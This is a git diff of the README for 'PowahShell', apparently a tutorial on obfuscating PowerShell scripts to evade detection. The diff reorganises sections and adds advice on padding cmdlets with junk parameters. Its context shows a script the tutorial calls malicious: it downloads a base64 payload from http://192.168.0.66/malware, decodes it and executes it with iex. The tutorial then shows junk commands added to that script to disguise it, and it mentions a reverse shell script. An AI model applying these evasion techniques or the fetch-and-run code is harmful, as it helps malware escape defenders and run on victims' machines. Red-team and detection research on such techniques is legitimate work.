@@ -1,14 +1,19 @@
 # PowahShell
 
 ## Techniques
-1. [Randomize Variable Names](#Randomize-Variable-Names)
-2. [Obfuscate Boolean Values](#Obfuscate-Boolean-Values)
-3. [Cmdlet Quote Interruption](#Cmdlet-Quote-Interruption)
-4. [Substitute Loops](#Substitute-Loops)
-5. [Substitute Commands](#Substitute-Commands)
-6. [Append Random Objects](#Append-Random-Objects)
-7. [Append/Remove Comments](#Append\/Remove-Comments)
-8. [Randomize Char Cases](#Randomize-Char-Cases)
+1. [Introduction](#Introduction)
+2. [Rename Objects](#Rename-Objects)
+3. [Obfuscate Boolean Values](#Obfuscate-Boolean-Values)
+4. [Cmdlet Quote Interruption](#Cmdlet-Quote-Interruption)
+5. [Substitute Loops](#Substitute-Loops)
+6. [Substitute Commands](#Substitute-Commands)
+7. [Append Junk](#Append-Junk)
+8. [Append/Remove Comments](#Append\/Remove-Comments)
+9. [Randomize Char Cases](#Randomize-Char-Cases)
+
+## Introduction
+
+## Rename Objects
 
 ![image](https://user-images.githubusercontent.com/75489922/231490064-863ab464-84f3-4b38-9c9e-a48c23e3070c.png)
 
@@ -118,7 +123,21 @@ There are certain loops that can be substituted with other loop types or functio
  }
  ```
 
-## Append Random Objects
+## Append Junk 
+
+### Add/Remove parameters
+You can try adding parameters to a cmdlet. For example, the following line:
+```
+iex "whoami"
+```
+
+Could be expanded to:
+```
+iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire "whoami"
+```
+You may of course try the opposite.
+
+### Append random objects
 You can "pollute" a script with random variables and functions. Assume the following script as malicious:  
 ```
 $b64 = $(irm -uri http://192.168.0.66/malware); 
@@ -132,6 +151,7 @@ $b64 = $(irm -uri http://192.168.0.66/malware); sleep 0.01;sleep 0.01;Get-Proces
 $virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));sleep 0.01;sleep 0.01;Measure-Object | Out-Null;
 iex $virus;
 ```
+
 
 ## Substitute Commands
 You can always look for commands or even whole code blocks in a script that you can substitute with components that have the same/similar functionality. In the following classic reverse shell script, the `pwd` command is used to retrieve the current working directory and reconstruct the shell's prompt value:  
